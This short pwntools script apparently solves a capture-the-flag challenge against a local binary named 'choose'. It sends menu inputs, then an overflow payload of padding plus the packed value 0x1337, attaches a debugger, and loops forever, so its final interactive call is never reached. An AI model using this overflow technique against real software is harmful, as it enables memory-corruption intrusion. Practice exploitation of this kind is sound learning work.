from pwn import *

p = process("./choose")

for i in range(11):
  p.sendlineafter(":", "u")

for i in range(10):
  p.sendlineafter(":", "CCCC")
p.sendlineafter(":", "A" * 2 +  p32(0x1337))

gdb.attach(p)
while True:
  p.sendlineafter("[F]: Flee", "A")




p.interactive()
